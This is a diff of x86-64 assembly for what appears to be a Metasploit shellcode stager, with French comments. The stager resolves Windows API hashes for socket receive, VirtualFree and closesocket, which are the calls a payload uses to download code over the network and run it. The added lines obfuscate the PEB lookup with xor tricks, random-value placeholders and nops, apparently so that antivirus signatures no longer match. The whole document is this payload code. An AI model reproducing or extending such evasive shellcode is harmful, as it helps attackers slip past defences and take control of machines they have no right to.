@@ -8,12 +8,22 @@ _start:
 metasploit_block_api:
     push r9
     push r8
+    xor rax,rax
+    mov rax,0xff
     push rdx
-    push rcx
     xor rdx,rdx
-    mov rdx,[gs:rdx+0x60]
-    push rsi
+    xor rax,0x9f
+    mov rax,[gs:rax] ; 0x60
+    xor rax,%RANDOM_1%
+    push rcx
+    mov rdx,rax
+    xor rdx,%RANDOM_1%
+    ; mov rdx,[rax+0x60]
     mov rdx,[rdx+0x18]
+    xor rdx,rax
+    push rsi
+    xor rdx,rax
+    nop
     mov rdx,[rdx+0x20]
 
 load_module_name:
@@ -157,7 +167,8 @@ to_rename_15e:
     mov r10d,%HASH__ws2_32.dll__recv% ; ws2_32.recv(0xd0,?,0x4) le ? similaire à au dessus à chaque fois
     call rbp            ; 5eme run
     cmp eax,byte +0x0
-    jng 0x1d1
+    jng to_rename_1d1
+    nop
     add rsp,byte +0x20
     pop rsi
     mov esi,esi
@@ -190,6 +201,8 @@ to_rename_1a2:
     pop rdx
     mov r10d,%HASH__kernel32.dll__VirtualFree% ; kernel32.VirtualFree(?),0,0x4000)
     call rbp            ; 8eme run
+    
+to_rename_1d1:
     push rdi
     pop rcx
     mov r10d,%HASH__ws2_32.dll__closesocket% ; ws2_32.closesocket(0xd0)
